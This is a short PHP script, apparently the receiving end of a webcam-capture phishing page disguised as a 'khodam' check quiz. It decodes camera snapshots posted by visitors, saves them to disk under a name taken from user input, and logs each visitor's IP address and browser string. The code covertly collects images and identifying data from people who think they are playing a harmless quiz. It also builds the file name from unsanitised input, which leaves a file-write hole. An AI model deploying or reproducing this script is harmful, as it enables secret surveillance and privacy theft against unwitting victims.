<?php
$date = date('dMYHis');
$imageData = $_POST['cat'] ?? '';
$khodamName = $_POST['khodamName'] ?? 'Unknown';

// Log file utama
$logFile = 'Log.txt';

// Jika ada data gambar
if (!empty($imageData)) {
    // Simpan gambar, nama file menyertakan Khodam
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);
    $fileName = 'cam_'.$khodamName.'_'.$date.'.png';
    $fp = fopen($fileName, 'wb');
    fwrite($fp, $unencodedData);
    fclose($fp);

    // Catat ke log
    $logContent = "[$date] Khodam: $khodamName | File: $fileName\r\n";
    file_put_contents($logFile, $logContent, FILE_APPEND);
}

// Bisa ditambahkan IP & User-Agent
$ipaddress = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown UA';
$logContent = "IP: $ipaddress | UA: $browser | Khodam: $khodamName | Time: $date\r\n";
file_put_contents($logFile, $logContent, FILE_APPEND);

exit();
?>
